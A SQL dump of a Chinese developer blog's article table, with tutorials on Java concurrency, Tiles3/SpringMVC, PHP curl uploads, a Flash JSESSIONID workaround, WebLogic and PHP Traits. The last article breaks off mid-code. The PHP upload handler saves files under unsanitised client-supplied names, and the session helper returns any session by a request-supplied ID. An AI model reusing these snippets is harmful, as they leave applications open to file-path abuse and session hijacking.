线程释放this对象的监控锁</p><p>所以，volatile仅仅是同步一个变量在线程内存和主内存中的值，synchronized同步线程内存和主内存中所有的变量值，并锁定和释放监控锁。看起来synchronized比volatile会产生更多的开销。</p><p>使用volatile关键字让变量不会保持在一个寄存器中，这保证了这个变量在线程之间是真实的可共享的。</p><p>在虚拟机中的同步必须让变量在寄存器中是无效的。<br/></p><p>当虚拟机进入了同步方法或者是同步块时，它必须冲在在本地寄存器中缓存的数据。在虚拟机推出同步方法或者是同步块之前，它必须存储它的本地寄存器到主内存中。</p><p><br/></p><p>原文[<a href="http://sumitpal.wordpress.com/2010/05/22/volatile-and-synchronized-in-java-explained/">http://sumitpal.wordpress.com/2010/05/22/volatile-and-synchronized-in-java-explained/</a>]</p>', '最好的理解方式是通过查看volatile和synchronized的不同效果。volatile是一个字段修饰符，而synchronized则用来修饰一个代码块或者是方法。因此，我们可以列出使用这两个关键字的三种不同的访问方式', 'http://agiledev-arsenals.stor.sinaapp.com/cover/aa0b672be397ca9b7ef344f5f78b936d.jpg', 'mylxsw', '翻译', 1, 0, 1396512854, 1396665979, 0, 'html'),
(333, 'Tiles3整合SpringMVC', '<p>在SpringMVC中使用Tiles还是很方便的，这里做一个简单的DEMO。</p><p>首先需要在项目的类库中添加相关的jar文件，这里使用的是Maven管理，因此，只需要添加pom即可.</p><pre class="brush:xml;toolbar:false;">&lt;!--&nbsp;Tiles&nbsp;--&gt;\r\n&lt;dependency&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;commons-digester&lt;/groupId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;commons-digester&lt;/artifactId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;2.1&lt;/version&gt;\r\n&lt;/dependency&gt;\r\n&lt;dependency&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;org.apache.tiles&lt;/groupId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;tiles-core&lt;/artifactId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;3.0.1&lt;/version&gt;\r\n&lt;/dependency&gt;\r\n&lt;dependency&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;org.apache.tiles&lt;/groupId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;tiles-api&lt;/artifactId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;3.0.1&lt;/version&gt;\r\n&lt;/dependency&gt;\r\n&lt;dependency&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;groupId&gt;org.apache.tiles&lt;/groupId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;artifactId&gt;tiles-jsp&lt;/artifactId&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;3.0.1&lt;/version&gt;\r\n&lt;/dependency&gt;</pre><p>添加完依赖的jar包之后，接下来需要配置SpringMVC使用Tiles的视图解析，这里使用的是Tiles3&nbsp;，因此需要Spring版本在3.2之上，低版本的只支持到Tiles2.</p><pre class="brush:xml;toolbar:false;">&lt;!--&nbsp;视图解析--&gt;\r\n&lt;bean&nbsp;id=&quot;tilesConfigurer&quot;&nbsp;class=&quot;org.springframework.web.servlet.view.tiles3.TilesConfigurer&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;definitions&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;list&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;value&gt;/WEB-INF/tiles/general.xml&lt;/value&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/list&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/property&gt;\r\n&lt;/bean&gt;\r\n&lt;bean&nbsp;id=&quot;viewResolver&quot;&nbsp;class=&quot;org.springframework.web.servlet.view.UrlBasedViewResolver&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;order&quot;&nbsp;value=&quot;1&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;viewClass&quot;&nbsp;value=&quot;org.springframework.web.servlet.view.tiles3.TilesView&quot;&gt;&lt;/property&gt;\r\n&lt;/bean&gt;\r\n&lt;bean\r\n&nbsp;&nbsp;&nbsp;&nbsp;class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;prefix&quot;&nbsp;value=&quot;/WEB-INF/views/&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;suffix&quot;&nbsp;value=&quot;.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;property&nbsp;name=&quot;order&quot;&nbsp;value=&quot;2&quot;&nbsp;/&gt;\r\n&lt;/bean&gt;</pre><p>这里配置了两个视图解析bean，当Tiles配置中没有匹配的规则时，使用SpringMVC默认的匹配规则。</p><pre class="brush:xml;toolbar:false;">&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;UTF-8&quot;&nbsp;?&gt;\r\n&lt;!DOCTYPE&nbsp;tiles-definitions&nbsp;PUBLIC&nbsp;&quot;-//Apache&nbsp;Software&nbsp;Foundation//DTD&nbsp;Tiles&nbsp;Configuration&nbsp;3.0//EN&quot;&nbsp;&quot;http://tiles.apache.org/dtds/tiles-config_3_0.dtd&quot;&gt;\r\n&lt;tiles-definitions&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;前端页面模板&nbsp;--&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;template_page&quot;&nbsp;template=&quot;/WEB-INF/templates/page.jsp&quot;&gt;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;template_base&quot;&nbsp;template=&quot;/WEB-INF/templates/base.jsp&quot;&gt;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;引用整体模板&nbsp;&nbsp;视图名&nbsp;+&nbsp;.page&nbsp;&nbsp;--&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;*.page&quot;&nbsp;extends=&quot;template_page&quot;&nbsp;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;put-attribute&nbsp;name=&quot;body&quot;&nbsp;value=&quot;/WEB-INF/views/{1}.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;*/*.page&quot;&nbsp;extends=&quot;template_page&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;put-attribute&nbsp;name=&quot;body&quot;&nbsp;value=&quot;/WEB-INF/views/{1}/{2}.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;*/*/*.page&quot;&nbsp;extends=&quot;template_page&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;put-attribute&nbsp;name=&quot;body&quot;&nbsp;value=&quot;/WEB-INF/views/{1}/{2}/{3}.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;*/*/*/*.page&quot;&nbsp;extends=&quot;template_page&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;put-attribute&nbsp;name=&quot;body&quot;&nbsp;value=&quot;/WEB-INF/views/{1}/{2}/{3}/{4}.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;引用基本模板&nbsp;&nbsp;&nbsp;视图名&nbsp;+&nbsp;.base&nbsp;--&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;*.base&quot;&nbsp;extends=&quot;template_base&quot;&nbsp;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;put-attribute&nbsp;name=&quot;body&quot;&nbsp;value=&quot;/WEB-INF/views/{1}.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;*/*.base&quot;&nbsp;extends=&quot;template_base&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;put-attribute&nbsp;name=&quot;body&quot;&nbsp;value=&quot;/WEB-INF/views/{1}/{2}.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;*/*/*.base&quot;&nbsp;extends=&quot;template_base&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;put-attribute&nbsp;name=&quot;body&quot;&nbsp;value=&quot;/WEB-INF/views/{1}/{2}/{3}.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/definition&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;definition&nbsp;name=&quot;*/*/*/*.base&quot;&nbsp;extends=&quot;template_base&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;put-attribute&nbsp;name=&quot;body&quot;&nbsp;value=&quot;/WEB-INF/views/{1}/{2}/{3}/{4}.jsp&quot;&nbsp;/&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/definition&gt;\r\n&lt;/tiles-definitions&gt;</pre><p>上面的Tiles配置文件中，配置了两个页面的模板，当Spring返回视图名为.page或者是.base后缀时，就会匹配到相应的模板。从这里可以看到，Tiles支持通配符匹配的，当然，你也可以使用正则表达式进行规则的匹配或者是Mvel等语言进行规则匹配。</p><p>在模板文件中，使用tiles的标签完成模板的创建。</p><p>如page.</p><pre class="brush:html;toolbar:false;">&lt;%@&nbsp;taglib&nbsp;prefix=&quot;tiles&quot;&nbsp;uri=&quot;http://tiles.apache.org/tags-tiles&quot;&nbsp;%&gt;\r\n&lt;html&gt;\r\n&lt;head&gt;\r\n...\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;tiles:insertAttribute&nbsp;name=&quot;body&quot;&nbsp;/&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;</pre><p>最后，在控制器中，只需要返回的视图名为.page就会自动的使用该模板了。</p><pre class="brush:java;toolbar:false;">@RequestMapping(&quot;login&quot;)\r\npublic&nbsp;String&nbsp;login(HttpServletRequest&nbsp;req,&nbsp;HttpServletResponse&nbsp;resp,&nbsp;HttpSession&nbsp;session){\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&quot;login.page&quot;;\r\n}</pre><p>&nbsp;</p>', '在SpringMVC中使用Tiles还是很方便的，这里做一个简单的DEMO。\r\n首先需要在项目的类库中添加相关的jar文件，这里使用的是Maven管理，因此，只需要添加pom即可\r\n添加完依赖的jar包之后，接下来需要配置SpringMVC使用Tiles的视图解析，这里使用的是Tiles3 ，因此需要Spring版本在3.2之上，低版本的只支持到Tiles2.', 'http://agiledev-arsenals.stor.sinaapp.com/cover/347bd989d0affe3ea4d62b2d6f3164b0.jpg', 'mylxsw', '原创', 1, 0, 1396520951, NULL, NULL, 'html'),
(334, 'PHP之curl', '<p>一. 函数简介</p><p><br/></p><p>curl_init() 初始化一个cURL会话</p><p></p><pre class="brush:php; toolbar: true; auto-links: true;">resource&nbsp;curl_init&nbsp;([&nbsp;string&nbsp;$url&nbsp;=&nbsp;NULL&nbsp;]&nbsp;)</pre><p>curl_setopt() 设置一个CURL传输选项</p><p></p><p></p><pre class="brush:php; toolbar: true; auto-links: true;">bool&nbsp;curl_setopt&nbsp;(&nbsp;resource&nbsp;$ch&nbsp;,&nbsp;int&nbsp;$option&nbsp;,&nbsp;mixed&nbsp;$value&nbsp;)</pre><p>curl_exec() 执行一个curl会话</p><p></p><p></p><pre class="brush:php; toolbar: true; auto-links: true;">mixed&nbsp;curl_exec&nbsp;(&nbsp;resource&nbsp;$ch&nbsp;)</pre><p>curl_close() 关闭一个curl会话</p><p></p><p></p><pre class="brush:php; toolbar: true; auto-links: true;">void&nbsp;curl_close&nbsp;(&nbsp;resource&nbsp;$ch&nbsp;)</pre><p>详情见<a href="http://www.php.net/manual/zh/book.curl.php" target="_blank">官方文档</a>。</p><p></p><p>二. 一个文件上传的例子</p><p>test/curl_upload.php &nbsp; &nbsp;访问该文件，将模拟表单提交文件到upload.php</p><p></p><pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php\r\n$data=&nbsp;array(\r\n	&#39;name&#39;&nbsp;=&gt;&nbsp;&#39;test&#39;,\r\n	&#39;file&#39;&nbsp;=&gt;&nbsp;&#39;@C:\\mylog.log&#39;&nbsp;//C盘的某个文件，注意，前缀要有一个@符号\r\n	);\r\n\r\n$ch&nbsp;=&nbsp;curl_init();//初始化curl\r\ncurl_setopt($ch	,CURLOPT_URL&nbsp;,&quot;http://localhost/test/other/upload.php&quot;&nbsp;);\r\ncurl_setopt($ch&nbsp;,&nbsp;CURLOPT_POST&nbsp;,&nbsp;1);\r\ncurl_setopt($ch&nbsp;,&nbsp;CURLOPT_POSTFIELDS,&nbsp;$data);\r\n\r\ncurl_exec($ch);\r\n\r\n?&gt;</pre><p>test/other/upload.php &nbsp; &nbsp;接受通过post提交的文件，并保存到test/data/文件夹中</p><p></p><p></p><pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php\r\n\r\nif(move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],&nbsp;&#39;../data/&#39;&nbsp;.&nbsp;$_FILES[&#39;file&#39;][&#39;name&#39;])){\r\n	echo&nbsp;&quot;success&quot;;\r\n}else{\r\n	echo&nbsp;&quot;failed&quot;;\r\n}\r\n?&gt;</pre><p></p>', '介绍了PHP的curl函数处理文件上传。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/aa29571ccac80268a197bce2b1ffbd34.jpg', 'mylxsw', '原创', 1, 0, 1396521682, NULL, NULL, 'html'),
(335, 'Flash上传文件获取JSESSIONID问题', '<p>使用Flash插件进行文件上传时，在Firefox或者其他一些浏览器中，总是会出现JSESSIONID无法发送，以至于无法进行验证权限的问题，这里从网上找了一个解决方案，亲测可用，由于时间比较久了，找不到原始地址了。</p><p>代码是从网上找的，这里记录一下解决方案。</p><pre class="brush:java;toolbar:false">public&nbsp;class&nbsp;SessionContext&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;static&nbsp;SessionContext&nbsp;instance;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;HashMap&nbsp;sessionMap;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;SessionContext(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sessionMap&nbsp;=&nbsp;new&nbsp;HashMap();\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;SessionContext&nbsp;getInstance(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(instance&nbsp;==&nbsp;null){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;instance&nbsp;=&nbsp;new&nbsp;SessionContext();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;instance;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;@SuppressWarnings(&quot;unchecked&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;synchronized&nbsp;void&nbsp;addSession(HttpSession&nbsp;session){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(session&nbsp;!=&nbsp;null){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sessionMap.put(session.getId(),&nbsp;session&nbsp;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;synchronized&nbsp;void&nbsp;deleteSession(HttpSession&nbsp;session){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(session&nbsp;!=&nbsp;null){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sessionMap.remove(session.getId());\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;synchronized&nbsp;HttpSession&nbsp;getSession(String&nbsp;id){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(id&nbsp;==&nbsp;null){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;null;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(HttpSession)&nbsp;sessionMap.get(id);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</pre><pre class="brush:java;toolbar:false">public&nbsp;class&nbsp;SessionListener&nbsp;implements&nbsp;HttpSessionListener&nbsp;{\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;SessionContext&nbsp;sessionCtx&nbsp;=&nbsp;SessionContext.getInstance();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;@Override\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;void&nbsp;sessionCreated(HttpSessionEvent&nbsp;se)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sessionCtx.addSession(se.getSession());\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;@Override\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;void&nbsp;sessionDestroyed(HttpSessionEvent&nbsp;se)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sessionCtx.deleteSession(se.getSession());\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;\r\n}</pre><p><br/></p><p>web.xml中配置该监听器.</p><pre class="brush:java;toolbar:false">&lt;!--&nbsp;监听器&nbsp;&nbsp;--&gt;\r\n&nbsp;&nbsp;&lt;listener&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;listener-class&gt;cn.edu.ujn.framework.listener.SessionListener&lt;/listener-class&gt;\r\n&nbsp;&nbsp;&lt;/listener&gt;</pre><p>使用方式：</p><pre class="brush:java;toolbar:false">String&nbsp;jsessionId&nbsp;=&nbsp;request.getParameter(&quot;JSESSIONID&quot;).trim();\r\nHttpSession&nbsp;session&nbsp;=&nbsp;SessionContext.getInstance().getSession(jsessionId);</pre><p><br/></p>', '使用Flash插件进行文件上传时，在Firefox或者其他一些浏览器中，总是会出现JSESSIONID无法发送，以至于无法进行验证权限的问题，这里从网上找了一个解决方案，亲测可用，由于时间比较久了，找不到原始地址了。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/d6557c1eaebbca6b477764bbc9b07f8a.jpg', 'mylxsw', '整理', 1, 0, 1396537282, 1396666084, 0, 'html'),
(340, 'Win7下造字程序实现“王莹”字的制造', '<p>在项目开发中，有一个需要打印报告的功能，在报告中需要体现出用户的姓名，但是该用户姓名中含有一个非常不常见的汉字“王莹”（这两个字合起来是一个字，读作ying），windows中的GBK字符集不含有该字符，所以，用输入法是无法输入这个字的，但是用户急需报告，这个字必须要能够录入才能打印到报告上去。</p><p>这就用到了windows提供的造字程序，在XP下，可以在附件中找到造字程序，在win7之后的系统中，可以在开始菜单中搜索“专用字符编辑程序”，找到造字程序。</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/08/1396943702804797.jpg" title="1.jpg"/></p><p><br/></p><p>随便选择一个代码，然后确定即可。</p><p>在程序中写出要造的字，如果写不好，可以使用窗口-参考，找到相似字符，然后再上面赋值粘贴以便组合出需要的字即可。</p><p><img src="http://agiledev-arsenals.stor.sinaapp.com/2014/04/08/1396943787754332.jpg" title="2.jpg"/></p><p>完成后，在编辑中选择保存字符。具体参考：&nbsp;<a href="http://jingyan.baidu.com/article/ed2a5d1f100cf009f7be177b.html，" _src="http://jingyan.baidu.com/article/ed2a5d1f100cf009f7be177b.html，">http://jingyan.baidu.com/article/ed2a5d1f100cf009f7be177b.html</a></p><p>如果造的字需要在不同电脑上使用，我们不用重新造字，使用下面方法移植即可。</p><p>找到windows/fonts下的eudc.euf, EUDC.TTE, windows/system32下的lcphrase.tbl， lcptr.tbl复制到桌面，在桌面上新建一个文件们能够为copy.cmd，内容如下：</p><pre class="brush:ps;toolbar:false">@echo&nbsp;off\r\ncopy&nbsp;eudc.euf&nbsp;c:\\windows\\fonts\\\r\ncopy&nbsp;eudc.tte&nbsp;c:\\windows\\fonts\\\r\ncopy&nbsp;*.tbl&nbsp;c:\\windows\\system32\\\r\necho&nbsp;&quot;完成复制&quot;\r\npause</pre><p>注意的是，copy.cmd文件要与上面的四个文件在同一个目录下。</p><p>将5个文件复制到其它电脑上后，执行copy.cmd（双击），即可完成新造字的导入。</p><p><br/></p><p>已经做好的文件下载：&nbsp;</p><p style="line-height: 16px;"><img src="http://agiledev.sinaapp.com/Public/ueditor/dialogs/attachment/fileTypeImages/icon_rar.gif"/><a href="http://agiledev-arsenals.stor.sinaapp.com/2014/04/08/1396944928723966.zip">新造字.zip</a></p><p><br/></p>', '在项目开发中，有一个需要打印报告的功能，在报告中需要体现出用户的姓名，但是该用户姓名中含有一个非常不常见的汉字“王莹”（这两个字合起来是一个字，读作ying），windows中的GBK字符集不含有该字符，所以，用输入法是无法输入这个字的，但是用户急需报告，这个字必须要能够录入才能打印到报告上去.', 'http://agiledev-arsenals.stor.sinaapp.com/cover/bf1187483dc80a4366d9feb7132f9633.jpg', 'mylxsw', '原创整理', 1, 0, 1396945136, 1396945154, 0, 'html'),
(336, 'WebLogic创建domain报错BEA-090782', '<p>按照说明文档创建domain的时候出现以下错误</p><pre class="brush:bash;toolbar:false">BEA-090782\r\nError:&nbsp;Server&nbsp;is&nbsp;Running&nbsp;in&nbsp;Production&nbsp;Mode&nbsp;and&nbsp;Native&nbsp;Library(terminalio)&nbsp;to&nbsp;read&nbsp;the&nbsp;password&nbsp;securely&nbsp;from&nbsp;commandline&nbsp;is&nbsp;not&nbsp;found</pre><p>解决方案：\r\n &nbsp;&nbsp;</p><p><em>Verify that terminalio library exists in the path. You can set this by specifying -Djava.library.path to the directory where this library exists or you can use boot.properties to store the password or you can use -Dweblogic.management.allowPasswordEcho=true to enter the password in echo mode.</em> &nbsp; &nbsp; &nbsp; &nbsp;</p><p>创建domain的时候指定-Dweblogic..属性即可。</p><pre class="brush:bash;toolbar:false">java.exe&nbsp;-Dweblogic.management.allowPasswordEcho=true&nbsp;-Xmx1024m&nbsp;-XX:MaxPermSize=128m&nbsp;weblogic.Server</pre><p><br/></p>', '解决创建Domain时出现的BEA-090782错误提示。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/dbe2449f33cb6433cf14ae018b5f0e9a.gif', 'mylxsw', '整理', 1, 0, 1396537667, NULL, NULL, 'html');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(337, 'PHP之Traits', '<p><span style="line-height: 0px;">﻿</span>在PHP5.4.0之后，实现了一个代码重用的方法--Traits（特性）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Traits是一种在单继承语言中实现代码重用的机制。Traits通过允许开发人员重用在不同继承树中的多个独立的类中的方法，减少了单继承的限制。它通过定义一种方法去定义了类和Traits的组合的语义，减少了使用的复杂性，也避免了与多继承和代码混入相关的一系列问题。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Traits与类很相似，但是只是实现了在其中定义一组功能，与类不同的是，不能够对Traits进行实例化。Traits是对传统的继承的一种额外的补充，使得我们能够不使用继承而共享方法。</p><pre class="brush:php;toolbar:false">&lt;?php\r\n&nbsp;\r\ntrait&nbsp;SecurityDev{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//安全人员掌握的技能\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;sqlInjection(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;I&nbsp;can&nbsp;Sql&nbsp;Injection&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;findBugs(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;I&nbsp;can&nbsp;find&nbsp;bugs&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;dDos(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;I&nbsp;can&nbsp;attack&nbsp;some&nbsp;websites&nbsp;by&nbsp;DDOS&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n}\r\n&nbsp;\r\ntrait&nbsp;WebDev&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//web开发者掌握的技能\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;phpProgramming(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;php&nbsp;Programming&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;javaProgramming(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;java&nbsp;Programming&lt;br&nbsp;/&gt;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;usingHtml(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;